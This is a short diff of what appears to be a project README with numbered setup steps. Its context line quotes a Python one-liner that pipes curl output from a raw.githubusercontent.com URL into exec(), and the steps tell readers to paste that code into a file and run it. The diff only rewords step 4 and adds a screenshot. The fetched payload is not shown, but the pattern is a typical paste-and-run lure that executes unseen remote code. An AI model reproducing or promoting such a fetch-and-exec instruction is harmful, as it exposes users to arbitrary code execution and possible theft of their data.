@@ -21,7 +21,9 @@ exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.
 
 **3.** Paste the copied code inside it
 
-**4.** Run the file — all you need is Python installed
+**4.** Run the file all you need is python installed
+
+<img width="1503" height="671" alt="{C6033EB4-0562-4629-9F19-982A853B1F86}" src="https://github.com/user-attachments/assets/aa946565-b97d-42e9-84a8-ed6e19eb8066" />
 
 ---
 
